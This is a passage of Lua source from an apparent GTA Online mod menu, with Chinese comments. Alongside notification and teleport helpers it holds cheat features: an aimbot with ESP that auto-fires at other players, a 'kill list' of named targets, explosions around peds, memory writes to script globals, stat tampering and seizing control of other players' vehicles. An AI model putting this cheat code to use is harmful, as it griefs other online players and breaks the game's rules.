                        self.notif_padding * 2 * aspect_16_9) * notif.animation_state, notif_body_colour)
                directx.draw_rect(1 - self.notif_width - self.notif_padding * 2,
                    0.1 - self.notif_padding * 2 * aspect_16_9 + notif.current_y_pos,
                    self.notif_width + (self.notif_padding * 2),
                    self.notif_banner_height * aspect_16_9 * notif.animation_state, self.notif_banner_colour)
                directx.draw_text(1 - self.notif_padding - self.notif_width,
                    0.1 - self.notif_padding * aspect_16_9 + notif.current_y_pos, notif.title, ALIGN_TOP_LEFT,
                    self.notif_title_size, {
                        r = 1 * notif.animation_state,
                        g = 1 * notif.animation_state,
                        b = 1 * notif.animation_state,
                        a = 1 * notif.animation_state
                    })
                directx.draw_text(1 - self.notif_padding - self.notif_width,
                    0.1 - self.notif_padding * aspect_16_9 + notif.current_y_pos + notif.title_height, notif.text,
                    ALIGN_TOP_LEFT, self.notif_text_size, {
                        r = 1 * notif.animation_state,
                        g = 1 * notif.animation_state,
                        b = 1 * notif.animation_state,
                        a = 1 * notif.animation_state
                    })
                total_height = total_height +
                                   ((notif.total_height + self.notif_padding * 2 + self.notif_spacing) *
                                       notif.animation_state)
                if notif.marked_for_deletetion then
                    notif.animation_state = lerp(notif.animation_state, 0, 10 * delta_time)
                    if notif.animation_state < 0.05 then
                        table.remove(active_notifs, i)
                    end
                elseif notif.duration < 0 then
                    notif.marked_for_deletetion = true
                end
                notif.duration = notif.duration - delta_time
            end
            return #active_notifs > 0
        end)
    end
    self.notify = function(title, text, duration, colour)
        if self.use_toast then
            util.toast(title .. "\n" .. text)
            return
        end
        title = cut_string_to_length(title, self.notif_width, self.notif_title_size)
        text = cut_string_to_length(text, self.notif_width, self.notif_text_size)
        if directx.get_client_size() == 2560 then
            x, text_heigth = directx.get_text_size(text, self.notif_text_size - 0.125)
        elseif directx.get_client_size() == 1920 then
            x, text_heigth = directx.get_text_size(text, self.notif_text_size)
        else
            x, text_heigth = directx.get_text_size(text, self.notif_text_size)
        end
        local xx, title_height = directx.get_text_size(title, self.notif_title_size)
        local hash = util.joaat(title .. text)
        local new_notification = {
            title = title,
            flashtimer = self.notif_flash_duration,
            colour = colour or {
                r = 0.094,
                g = 0.098,
                b = 0.101,
                a = 0.5
            },
            duration = duration or 3,
            current_y_pos = -10,
            marked_for_deletetion = false,
            animation_state = 0,
            text = text,
            hash = hash,
            text_height = text_heigth,
            title_height = title_height,
            total_height = title_height + text_heigth
        }
        for i, notif in ipairs(active_notifs) do
            if notif.hash == hash then
                notif.flashtimer = self.notif_flash_duration * 0.5
                notif.marked_for_deletetion = false
                notif.duration = duration or 3
                return
            end
        end
        active_notifs[#active_notifs + 1] = new_notification
        if #active_notifs > self.max_notifs then
            table.remove(active_notifs, 1)
        end
        if #active_notifs == 1 then
            draw_notifs()
        end
    end
    return self
end
local mayonotification = b_notifications.new()
function notification(input)
    local name = PLAYER.GET_PLAYER_NAME(players.user())
    local shouldCallNotify = false -- 默认情况下不在 for 循环中调用
    for _, id in ipairs(spid) do
        if name == id.playerid then
            local combinedText = "GRANDTOURINGVIP\n" .. checkme()
            combinedText = combinedText:gsub("\n%s*", "\n") -- 移除换行后的空格
            mayonotification.notify(combinedText, input)
            shouldCallNotify = true -- 设置标志以在 for 循环中调用
        end
    end
    for _, id in ipairs(devid) do
        if name == id.playerrid then
            local combinedText = "GRANDTOURINGVIP\n" .. checkme()
            combinedText = combinedText:gsub("\n%s*", "\n") -- 移除换行后的空格
            mayonotification.notify(combinedText, input)
            shouldCallNotify = true -- 设置标志以在 for 循环中调用
        end
    end
    if not shouldCallNotify then
        mayonotification.notify("GRANDTOURINGVIP", input) -- 只有在标志为 false 时调用
    end
end
drawnotify = notification
scripts_dir = filesystem.scripts_dir()
if not filesystem.exists(scripts_dir) then
	notification("目录未找到",colors.red)
end
--Logo 在脚本开启时弹出
if SCRIPT_MANUAL_START then
--MISC.FORCE_LIGHTNING_FLASH()
end
if SCRIPT_MANUAL_START then
    util.create_thread(function()
        local photo = directx.create_texture(filesystem.scripts_dir() .. "GTLuaScript/GT.png")
        local l = -100
        while l <= 90 do
            for j = 1, 195, 5 do
                directx.draw_texture(photo, 0.06, 0.06, 0.5, -1.1, l/1500, 0.50, 0, {r = 1, g = 1, b = 1, a = j/255})
                wait(0)
                l = l + 5
            end
        end
        for i = 1, 320 do
                directx.draw_texture(photo, 0.06, 0.06, 0.5, -1.1, 0.06, 0.50, 0, {r = 1, g = 1, b = 1, a = 1.0})
            wait(0)
        end
        local k = 90
        while k >= -10 do
            for j = 195, 1, -5 do
                directx.draw_texture(photo, 0.06, 0.06, 0.5, -1.1, k/1500, 0.50, 0, {r = 1, g = 1, b = 1, a = j/255})
                wait(0)
                k = k - 5
            end
        end
    end)
end
function Ini.save(fileName, obj)
    local file<close> = assert(io.open(fileName, "w"), "error loading file")
    local s = {}
    for section, tbl in pairs(obj) do
        assert(type(tbl) == "table", "expected field " .. section .. " to be a table, got " .. type(tbl))
        local l = {}
        table.insert(l, string.format("[%s]", section))
        for k, v in pairs(tbl) do
            table.insert(l, string.format("%s=%s", k, v))
        end
        table.insert(s, table.concat(l, '\n') .. '\n')
    end
    file:write(table.concat(s, '\n'))
end
function Ini.load(fileName)
    assert(type(fileName) == "string", "fileName must be a string")
    local file<close> = assert(io.open(fileName, "r"), "error loading file: " .. fileName)
    local data = {}
    local section
    for line in io.lines(fileName) do
        local tempSection = string.match(line, '^%[([^%]]+)%]$')
        if tempSection ~= nil then
            section = tonumber(tempSection) and tonumber(tempSection) or tempSection
            data[section] = data[section] or {}
        end
        local param, value = string.match(line, '^([%w_]+)%s*=%s*(.+)$')
        if section ~= nil and param and value ~= nil then
            if value == "true" then
                value = true
            elseif value == "false" then
                value = false
            elseif tonumber(value) then
                value = tonumber(value)
            end
            data[section][tonumber(param) or param] = value
        end
    end
    return data
end
hud_rgb_index = 1
hud_rgb_colors = {6, 18, 9}
cTime = util.current_time_millis
--Version = "7.14"
function give_car_addon(pid, hash, center, ang)
    local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
    local pos = ENTITY.GET_ENTITY_COORDS(car, true)
    pos.x = pos['x']
    pos.y = pos['y']
    pos.z = pos['z']
    request_model_load(hash)
    local ramp = OBJECT.CREATE_OBJECT_NO_OFFSET(hash, pos['x'], pos['y'], pos['z'], true, false, false)
    local size = get_model_size(ENTITY.GET_ENTITY_MODEL(car))
    if center then
        ENTITY.ATTACH_ENTITY_TO_ENTITY(ramp, car, 0, 0.0, 0.0, 0.0, 0.0, 0.0, ang, true, true, true, false, 0, true)
    else
        ENTITY.ATTACH_ENTITY_TO_ENTITY(ramp, car, 0, 0.0, size['y']+1.0, 0.0, 0.0, 0.0, ang, true, true, true, false, 0, true)
    end
end
local function SF_ff9()
    local scaleform = require('GTlib.Z')
    local sf = scaleform('instructional_buttons')
    HUD.HIDE_HUD_COMPONENT_THIS_FRAME(6)
    HUD.HIDE_HUD_COMPONENT_THIS_FRAME(7)
    HUD.HIDE_HUD_COMPONENT_THIS_FRAME(8)
    HUD.HIDE_HUD_COMPONENT_THIS_FRAME(9)
    memory.write_int(memory.script_global(1645739+1121), 1)
    sf.CLEAR_ALL()
    sf.TOGGLE_MOUSE_BUTTONS(false)
    sf.SET_DATA_SLOT(0,PAD.GET_CONTROL_INSTRUCTIONAL_BUTTON(0, 86, true), '爆炸 或 推开按')
    sf.DRAW_INSTRUCTIONAL_BUTTONS()
    sf:draw_fullscreen()
end
function show_custom_alert_until_enter(l1)
    poptime = os.time()
    while true do
        if PAD.IS_CONTROL_JUST_RELEASED(18, 18) then
            if os.time() - poptime > 0.1 then
                break
            end
        end
        native_invoker.begin_call()
        native_invoker.push_arg_string("ALERT")
        native_invoker.push_arg_string("JL_INVITE_ND")
        native_invoker.push_arg_int(2)
        native_invoker.push_arg_string("")
        native_invoker.push_arg_bool(true)
        native_invoker.push_arg_int(-1)
        native_invoker.push_arg_int(-1)
        native_invoker.push_arg_string(l1)
        native_invoker.push_arg_int(0)
        native_invoker.push_arg_bool(true)
        native_invoker.push_arg_int(0)
        native_invoker.end_call("701919482C74B5AB")
        wait()
    end
end
--弹射起步
function boost_player_vehicle_forward(pid)
    local player_ped = PLAYER.GET_PLAYER_PED(pid)
    local player_vehicle = get_vehicle_ped_is_in(player_ped, include_last_vehicle_for_player_functions)
    if player_vehicle == 0 then
        gtoast(players.get_name(pid) .. " 不在车中.")
    else
        request_control(player_vehicle)
        ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(player_vehicle, 1, 0.0, 1000.0, 0.0, true, true, true, true)
        announce(players.get_name(pid) .. "'车辆猛冲.")
    end
end
function get_vehicle_ped_is_in(ped, includeLastVehicle)
    if includeLastVehicle or PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
        return PED.GET_VEHICLE_PED_IS_IN(ped, false)
    end
    return 0
end
function announce(string)
    if announce_actions then
        gtoast(string)
    end
end
function loadModel(hash)
    STREAMING.REQUEST_MODEL(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash) do wait() end
end
--爆炸所有玩家
        expSettings = {
            camShake = 0, invisible = false, audible = true, noDamage = false, owned = false, blamed = false, blamedPlayer = false, expType = 0,
            colour = New.colour( 255, 0, 255 )
        }
--一键雪球
function yijianxueqiu()
local plist = players.list()
    local snowballs = util.joaat('WEAPON_SNOWBALL')
    for i = 1, #plist do
        local plyr = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(plist[i])
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(plyr, snowballs, 20, true)
        WEAPON.SET_PED_AMMO(plyr, snowballs, 20)
        wait()
    end
    gtoast("已获得雪球 x10")
end
--一键烟花
function yijianyanhua()
local plist = players.list()
local fireworks = util.joaat('weapon_firework')
for i = 1, #plist do
    local plyr = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(plist[i])
    WEAPON.GIVE_DELAYED_WEAPON_TO_PED(plyr, fireworks, 20, true)
    WEAPON.SET_PED_AMMO(plyr, fireworks, 20)
    wait()
end
gtoast("已获得烟花发射器(20发) x1")
end
--绘制文字
function draw_string(s, x, y, scale, font)
	HUD.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("STRING")
	HUD.SET_TEXT_FONT(0)
	HUD.SET_TEXT_SCALE(scale, scale)
	HUD.SET_TEXT_DROP_SHADOW()
	HUD.SET_TEXT_WRAP(0.0, 1.0)
	HUD.SET_TEXT_DROPSHADOW(1, 0, 0, 0, 0)
	HUD.SET_TEXT_OUTLINE()
	HUD.SET_TEXT_EDGE(1, 0, 0, 0, 0)
	HUD.ADD_TEXT_COMPONENT_SUBSTRING_PLAYER_NAME(s)
	HUD.END_TEXT_COMMAND_DISPLAY_TEXT(x, y)
end
--彩虹颜色
local mcxh=1
local mcr=255
local mcg=0
local mcb=0
function rainbow_color()
        if mcxh==1 and mcg<256 then
            HUD.SET_TEXT_COLOUR(mcr, mcg, mcb, 255)	
            if mcg == 255 then
                mcxh=2
            else
                mcg=mcg+1
            end
        elseif mcxh==2 and mcr>-1 then
            HUD.SET_TEXT_COLOUR(mcr,mcg,mcb,255)
            if mcr == 0 then
                mcxh=3
            else
                mcr=mcr-1
            end
        elseif mcxh==3 and mcb<256 then
            HUD.SET_TEXT_COLOUR(mcr,mcg,mcb,255)
            if mcb == 255 then
                mcxh=4
            else
                mcb=mcb+1
            end
        elseif mcxh==4 and mcg>-1 then
            HUD.SET_TEXT_COLOUR(mcr,mcg,mcb,255)
            if mcg == 0 then
                mcxh=5
            else
                mcg=mcg-1
            end
        elseif mcxh==5 and mcr<256 then
            HUD.SET_TEXT_COLOUR(mcr,mcg,mcb,255)
            if mcr == 255 then
                mcxh=6
            else
                mcr=mcr+1
            end
        elseif mcxh==6 and mcb>-1 then
            HUD.SET_TEXT_COLOUR(mcr,mcg,mcb,255)
            if mcb == 0 then
                mcxh=1
            else
                mcb=mcb-1
            end
        end
end
function HIDE(scaleform)
	GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform, "HIDE")
	GRAPHICS.BEGIN_TEXT_COMMAND_SCALEFORM_STRING("STRING")
	HUD.ADD_TEXT_COMPONENT_SUBSTRING_PLAYER_NAME("presents")
	GRAPHICS.END_TEXT_COMMAND_SCALEFORM_STRING()
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_FLOAT(0.16)
	GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
end
local function get_offset_from_gameplay_camera(distance)
    local cam_rot = CAM.GET_GAMEPLAY_CAM_ROT(2)
    local cam_pos = CAM.GET_GAMEPLAY_CAM_COORD()
    local direction = v3.toDir(cam_rot)
    local destination = v3(direction)
    destination:mul(distance)
    destination:add(cam_pos)
    return destination
end
nuke_height = 10
function lhgd(value)
    nuke_height = value
end
function STAT_SET_INCREMENT(Stat, Value)
    if string.find(Stat, "MPPLY_") or string.find(Stat, "MP_") then
        STATS.STAT_INCREMENT(util.joaat(Stat), Value, true)
    else
        STATS.STAT_INCREMENT(util.joaat(MP_INDEX() .. Stat), Value, true)
    end
end
local launcherThrowable = util.joaat('weapon_grenade')
local throwables_launcher
function throwablebullet(toggle)
    throwables_launcher = toggle
    util.create_tick_handler(function()
        if WEAPON.GET_SELECTED_PED_WEAPON(players.user_ped()) == -1568386805 then --if holding grenade launcher
            if PED.IS_PED_SHOOTING(players.user_ped()) then
                if not remove_projectiles then
                    remove_projectiles = true
                    disableProjectileLoop(-1568386805)
                end
                util.create_thread(function()
                    local currentWeapon = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(players.user_ped(), false)
                    local pos1 = ENTITY._GET_ENTITY_BONE_POSITION_2(currentWeapon, ENTITY.GET_ENTITY_BONE_INDEX_BY_NAME(currentWeapon, 'gun_muzzle'))
                    local pos2 = get_offset_from_gameplay_camera(30)
                    if not WEAPON.HAS_PED_GOT_WEAPON(players.user_ped(), launcherThrowable, false) then
                        WEAPON.GIVE_WEAPON_TO_PED(players.user_ped(), launcherThrowable, 9999, false, false)
                    end
                    wait()
                    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos1.x, pos1.y, pos1.z, pos2.x, pos2.y, pos2.z, 200, true, launcherThrowable, players.user_ped(), true, false, 2000.0)
                end)
            else
                remove_projectiles = false
            end
        else
            remove_projectiles = false
        end
        return throwables_launcher
    end)
end
local explosion_circle_angle = 0
function explosion_circle(ped, angle, radius)
    local ped_coords = ENTITY.GET_ENTITY_COORDS(ped)
    local offset_x = ped_coords.x
    local offset_y = ped_coords.y
    local x = offset_x + radius * math.cos(angle)
    local y = offset_y + radius * math.sin(angle)
    FIRE.ADD_EXPLOSION(x, y, ped_coords.z, 4, 1, true, false, 0)
end
function pwdl(toggle)
    local graceRef = refbypass("Self>Gracefulness")
    local valueragdoll = getvalue(graceRef)
    togglestate = toggle
    while(togglestate) do
        while(PED.IS_PED_FALLING(players.user_ped())) do
            local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
            local floorcoords, success
            repeat
                success, floorcoords = util.get_ground_z(c.x, c.y)
                wait()
            until success
            if(c.z >= floorcoords + 5) then
                if not (c.z >= floorcoords + 7) then
                    if(valueragdoll) then --baguette
                        TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped())
                    else
                        menu.trigger_commands("grace on")
                    end
                end
            end
            wait()
        end
        wait()
    end
end
--恶灵骑士
looped_ptfxs = {}
burning_man_ptfx_asset = "core"
burning_man_ptfx_effect = "fire_wrecked_plane_cockpit"
function elqes()
vehicleelqs = CreateVehicle (1491277511,ENTITY.GET_ENTITY_COORDS(players.user_ped(),false),0,true)
ENTITY.SET_ENTITY_RENDER_SCORCHED(vehicleelqs,true)
VEHICLE.SET_VEHICLE_COLOURS(vehicleelqs,147,147)
VEHICLE.SET_VEHICLE_EXTRA_COLOURS(vehicleelqs,30,15)
PED.SET_PED_INTO_VEHICLE(players.user_ped(),vehicleelqs,-1)
wait(500)
request_ptfx_asset_firemen(burning_man_ptfx_asset)
        for _, boneName in pairs({"wheel_lf", "wheel_lr"}) do
GRAPHICS.USE_PARTICLE_FX_ASSET(burning_man_ptfx_asset)
            local bone_id = ENTITY.GET_ENTITY_BONE_INDEX_BY_NAME(vehicleelqs, boneName)
            fx = GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE(burning_man_ptfx_effect, vehicleelqs, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, bone_id, 0.9, false, false, false, 0, 0, 0, 0)
            looped_ptfxs[#looped_ptfxs+1] = fx
            GRAPHICS.SET_PARTICLE_FX_LOOPED_COLOUR(fx, 100, 100, 100, false)
      end
end
--zimiao
 ESPrgb = {color= {r= 0, g = 1, b = 0, a = 1}}
 ESPcolor = {
    r = math.floor(ESPrgb.color.r * 255),
    g = math.floor(ESPrgb.color.g * 255),
    b = math.floor(ESPrgb.color.b * 255),
    a = math.floor(ESPrgb.color.a * 255)
}
 target = true
 aimbot = {esp = true, box = true, bone = 31086, curweap = true, weapon = 'WEAPON_TACTICALRIFLE', damage = 200, targetveh = true,
fov = 3, tarplayers = true, tarnpcs = true, tarfriends = false, owner = players.user_ped(), stw = false, kill_list = false, alert = true}
function Ped_aim_pool(fov)
    local ped_handles = entities.get_all_peds_as_handles()
    for ped_handles as ped do
        if players.user_ped() != ped and not PED.IS_PED_DEAD_OR_DYING(ped, 1) and ENTITY.DOES_ENTITY_EXIST(ped) then
            local ped_coor = ENTITY.GET_ENTITY_COORDS(ped, true)
            local player_coor = ENTITY.GET_ENTITY_COORDS(players.user_ped(), true)
            local disbet = SYSTEM.VDIST2(ped_coor.x, ped_coor.y, ped_coor.z, player_coor.x, player_coor.y, player_coor.z)
            local too_far = 60000
            if not PED.IS_PED_FACING_PED(players.user_ped(), ped, fov) then
                target = false
            else
                target = true
            end
            if disbet >= too_far then
                target = false
            end
            if PED.IS_PED_A_PLAYER(ped) and not aimbot.tarplayers or aimbot.kill_list then
                target = false
            end
            if not PED.IS_PED_A_PLAYER(ped) and not aimbot.tarnpcs or aimbot.kill_list then
                target = false
            end
            if PED.IS_PED_IN_ANY_VEHICLE(ped, true) and not aimbot.targetveh then
                target = false
            end
            if not ENTITY.HAS_ENTITY_CLEAR_LOS_TO_ENTITY(players.user_ped(), ped, 17) and not aimbot.stw then
                target = false
            end
            local handle_ptr = memory.alloc(13*8)
            local function pid_to_handle(pid)--credits to lance
                NETWORK.NETWORK_HANDLE_FROM_PLAYER(pid, handle_ptr, 13)
                return handle_ptr
            end
            if PED.IS_PED_A_PLAYER(ped) and aimbot.tarplayers and not aimbot.tarfriends then
                local pid = NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(ped)
                local hdl = pid_to_handle(pid)
                if NETWORK.NETWORK_IS_FRIEND(hdl) then
                    target = false
                end
            end
            if PED.IS_PED_A_PLAYER(ped) and aimbot.kill_list then
                local pid = NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(ped)
                local pname = PLAYER.GET_PLAYER_NAME(pid)
                for load_settings(Kill_List) as Names do
                    for Names as name do
                        if name == pname then
                            target = true
                        end
                    end
                end       
            end
            if target and PLAYER.IS_PLAYER_FREE_AIMING(players.user()) then
                aim_target = ped
                AimbotTarget(aimbot, aim_target, ESPrgb)
                if aim_target > 1 then
                    break
                end
            else 
                aim_target = 0
            end
        end
    end
    return aim_target
end
 SuperESPrgb = {color= {r= 0, g = 1, b = 0, a = 1}}
 SuperESPcolor = {
    r = math.floor(ESPrgb.color.r * 255),
    g = math.floor(ESPrgb.color.g * 255),
    b = math.floor(ESPrgb.color.b * 255),
    a = math.floor(ESPrgb.color.a * 255)
}
function Xraytarget(xray, aim_target, rgb)
    if xray.espline then
        Draw_esp(aim_target, rgb)
    end
    if xray.espbox then
        local color = {
            r = rgb.color.r * 255,
            g = rgb.color.g * 255,
            b = rgb.color.b * 255,
            a = rgb.color.a * 255
        }
        draw_bounding_box(aim_target, color)
    end
    if xray.espbones then
        Bone_Esp(aim_target, SuperESPrgb)  
    end
end
function AimbotTarget(aimbot, aim_target, rgb)
    if PED.IS_PED_A_PLAYER(aim_target) then
        local pid = NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(aim_target)
        local pname = PLAYER.GET_PLAYER_NAME(pid)
        if aimbot.alert then
            ACutil(Str_trans('Target is ')..pname)
        end
    end
    if aimbot.esp then
        Draw_esp(aim_target, ESPrgb)
    end
    if aimbot.box then
        local color = {
            r = rgb.color.r * 255,
            g = rgb.color.g * 255,
            b = rgb.color.b * 255,
            a = rgb.color.a * 255
        }
        draw_bounding_box(aim_target, color)
    end
    if aimbot.curweap and PED.IS_PED_SHOOTING(players.user_ped()) then
       aimbot.weapon = util.reverse_joaat(WEAPON.GET_SELECTED_PED_WEAPON(players.user_ped()))
       ShootPed(aim_target, util.joaat(aimbot.weapon))
    elseif not aimbot.curweap and PED.IS_PED_SHOOTING(players.user_ped()) then
        ShootPed(aim_target, util.joaat(aimbot.weapon))
    end
end
function ShootPed(ped, weap)
    local bone_coor = PED.GET_PED_BONE_COORDS(ped, aimbot.bone, 0, 0, 0)
    local bone_coor2 = PED.GET_PED_BONE_COORDS(ped, aimbot.bone, -0.1, 0, 0)
    local bone_coor3 = PED.GET_PED_BONE_COORDS(ped, aimbot.bone, 0.1, 0, 0)
    for i = 1, 3 do
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(bone_coor2.x, bone_coor2.y, bone_coor2.z, bone_coor3.x, bone_coor3.y, bone_coor3.z, aimbot.damage, 0, weap, aimbot.owner, false, false, 1000)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(bone_coor.x, bone_coor.y, bone_coor.z + 1 , bone_coor.x, bone_coor.y, bone_coor.z - 1, aimbot.damage, 0, weap, aimbot.owner , false, false, 1000)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(bone_coor.x, bone_coor.y, bone_coor.z - 1 , bone_coor.x, bone_coor.y, bone_coor.z + 1, aimbot.damage, 0, weap, aimbot.owner , false, false, 1000)
    end
end
 function RequestControl(Entity, timeout)
    local time = util.current_time_millis() + (timeout or 1000)
    while time > util.current_time_millis() and not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(Entity) do
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(Entity)
        wait()
    end
    return NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(Entity)
end
 function ClearEntities(list)
    for _, entity in pairs(list) do
        if ENTITY.DOES_ENTITY_EXIST(entity) then
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(entity, false, false)
            RequestControl(entity)
            entities.delete_by_handle(entity)
        end
    end
end
function for_table_do(table,with_access,func)
	for i,ent in ipairs(table) do
		if with_access then
			if not RequestControlOfEnt(ent) then goto skip end
		end
		func(ent)
		::skip::
	end
end
function get_player_veh(pid,with_access)
	local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)	
	if PED.IS_PED_IN_ANY_VEHICLE(ped,true) then
		local vehicle = PED.GET_VEHICLE_PED_IS_IN(ped, false)
		if not with_access then
			return vehicle
		end
		if RequestControlOfEnt(vehicle) then
			return vehicle
		end
	end
	return 0
end
function teleport_place()
    local interiors = {{"安全空间 [挂机室]", {
        x = -158.71494,
        y = -982.75885,
        z = 149.13135
    }}, {"酷刑室", {
        x = 147.170,
        y = -2201.804,
        z = 4.688
    }}, {"矿道", {
        x = -595.48505,
        y = 2086.4502,
        z = 131.38136
    }}, {"欧米茄车库", {
        x = 2330.2573,
        y = 2572.3005,
        z = 46.679367
    }}, {"末日任务服务器组", {
        x = 2155.077,
        y = 2920.9417,
        z = -81.075455
    }}, {"角色捏脸房间", {
        x = 402.91586,
        y = -998.5701,
        z = -99.004074
    }}, {"Lifeinvader大楼", {
        x = -1082.8595,
        y = -254.774,
        z = 37.763317
    }}, {"竞速结束车库", {
        x = 405.9228,
        y = -954.1149,
        z = -99.6627
    }}, {"被摧毁的医院", {
        x = 304.03894,
        y = -590.3037,
        z = 43.291893
    }}, {"体育场", {
        x = -256.92334,
        y = -2024.9717,
        z = 30.145584
    }}, {"Split Sides喜剧俱乐部", {
        x = -430.00974,
        y = 261.3437,
        z = 83.00648
    }}, {"巴哈马酒吧", {
        x = -1394.8816,
        y = -599.7526,
        z = 30.319544
    }}, {"看门人之家", {
        x = -110.20285,
        y = -8.6156025,
        z = 70.51957
    }}, {"费蓝德医生之家", {
        x = -1913.8342,
        y = -574.5799,
        z = 11.435149
    }}, {"杜根房子", {
        x = 1395.2512,
        y = 1141.6833,
        z = 114.63437
    }}, {"弗洛伊德公寓", {
        x = -1156.5099,
        y = -1519.0894,
        z = 10.632717
    }}, {"麦克家", {
        x = -813.8814,
        y = 179.07889,
        z = 72.15914
    }}, {"富兰克林家（旧）", {
        x = -14.239959,
        y = -1439.6913,
        z = 31.101551
    }}, {"富兰克林家（新）", {
        x = 7.3125067,
        y = 537.3615,
        z = 176.02803
    }}, {"崔佛家", {
        x = 1974.1617,
        y = 3819.032,
        z = 33.436287
    }}, {"莱斯斯家", {
        x = 1273.898,
        y = -1719.304,
        z = 54.771
    }}, {"莱斯特的纺织厂", {
        x = 713.5684,
        y = -963.64795,
        z = 30.39534
    }}, {"莱斯特的纺织厂办事处", {
        x = 707.2138,
        y = -965.5549,
        z = 30.412853
    }}, {"甲基安非他明实验室", {
        x = 1391.773,
        y = 3608.716,
        z = 38.942
    }}, {"人道实验室", {
        x = 3625.743,
        y = 3743.653,
        z = 28.69009
    }}, {"汽车旅馆客房", {
        x = 152.2605,
        y = -1004.471,
        z = -99.024
    }}, {"警察局", {
        x = 443.4068,
        y = -983.256,
        z = 30.689589
    }}, {"太平洋标准银行金库", {
        x = 263.39627,
        y = 214.39891,
        z = 101.68336
    }}, {"布莱恩郡银行", {
        x = -109.77874,
        y = 6464.8945,
        z = 31.626724
    }}, {"龙舌兰酒吧", {
        x = -564.4645,
        y = 275.5777,
        z = 83.074585
    }}, {"废料厂车库", {
        x = 485.46396,
        y = -1315.0614,
        z = 29.2141
    }}, {"失落摩托帮", {
        x = 980.8098,
        y = -101.96038,
        z = 74.84504
    }}, {"范吉利科珠宝店", {
        x = -629.9367,
        y = -236.41296,
        z = 38.057056
    }}, {"机场休息室", {
        x = -913.8656,
        y = -2527.106,
        z = 36.331566
    }}, {"停尸房", {
        x = 240.94368,
        y = -1379.0645,
        z = 33.74177
    }}, {"联盟保存处", {
        x = 1.298771,
        y = -700.96967,
        z = 16.131021
    }}, {"军事基地瞭望塔", {
        x = -2357.9187,
        y = 3249.689,
        z = 101.45073
    }}, {"事务所内部", {
        x = -1118.0181,
        y = -77.93254,
        z = -98.99977
    }}, {"复仇者内部", {
        x = 518.6444,
        y = 4750.4644,
        z = -69.3235
    }}, {"恐霸内部", {
        x = -1421.015,
        y = -3012.587,
        z = -80.000
    }}, {"地堡内部", {
        x = 899.5518,
        y = -3246.038,
        z = -98.04907
    }}, {"IAA 办公室", {
        x = 128.20,
        y = -617.39,
        z = 206.04
    }}, {"FIB 顶层", {
        x = 135.94359,
        y = -749.4102,
        z = 258.152
    }}, {"FIB 47层", {
        x = 134.5835,
        y = -766.486,
        z = 234.152
    }}, {"FIB 49层", {
        x = 134.635,
        y = -765.831,
        z = 242.152
    }}, {"大公鸡", {
        x = -31.007448,
        y = 6317.047,
        z = 40.04039
    }}, {"大麻商店", {
        x = -1170.3048,
        y = -1570.8246,
        z = 4.663622
    }}, {"脱衣舞俱乐部DJ位置", {
        x = 121.398254,
        y = -1281.0024,
        z = 29.480522
    }}}
    for index, data in pairs(interiors) do
        local location_name = data[1]
        local location_coords = data[2]
        menu.action(teleport, location_name, {}, "", function()
            menu.trigger_commands("doors on")
            menu.trigger_commands("nodeathbarriers on")
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(players.user_ped(), location_coords.x, location_coords.y,
                location_coords.z, false, false, false)
        end)
    end
end
function Getmodcou(pid, mod)
    local pedm = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local vmod = PED.GET_VEHICLE_PED_IS_IN(pedm, false)
    if PED.IS_PED_IN_ANY_VEHICLE(pedm) ==true then
        local max = VEHICLE.GET_NUM_VEHICLE_MODS(vmod, mod)
        return max
    end
end
function Changewhepercolor(pid, color)
    local pedm = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local vmod = PED.GET_VEHICLE_PED_IS_IN(pedm, true)
    local spec = GetSpec(pid)
    if not players.exists(pid) then
        util.stop_thread()
    end
    GetControl(vmod, spec, pid)
    VEHICLE.SET_VEHICLE_FIXED(vmod)
    VEHICLE.SET_VEHICLE_EXTRA_COLOURS(vmod, color.per, color.whe)
end
function Changehead(pid, color)
    local pedm = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local vmod = PED.GET_VEHICLE_PED_IS_IN(pedm, true)
    local spec = GetSpec(pid)
    if not players.exists(pid) then
        util.stop_thread()
    end
    GetControl(vmod, spec, pid)
    VEHICLE.TOGGLE_VEHICLE_MOD(vmod, 22, true)
    VEHICLE.SET_VEHICLE_XENON_LIGHT_COLOR_INDEX(vmod, color)
end
function Changewheel(pid, wtype, wheel)
    local pedm = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local vmod = PED.GET_VEHICLE_PED_IS_IN(pedm, true)
    local vhash = ENTITY.GET_ENTITY_MODEL(vmod)
    local spec = GetSpec(pid)
    if not players.exists(pid) then
        util.stop_thread()
    end
        GetControl(vmod, spec, pid)
    if VEHICLE.IS_THIS_MODEL_A_BIKE(vhash) then
        VEHICLE.SET_VEHICLE_WHEEL_TYPE(vmod, wtype)
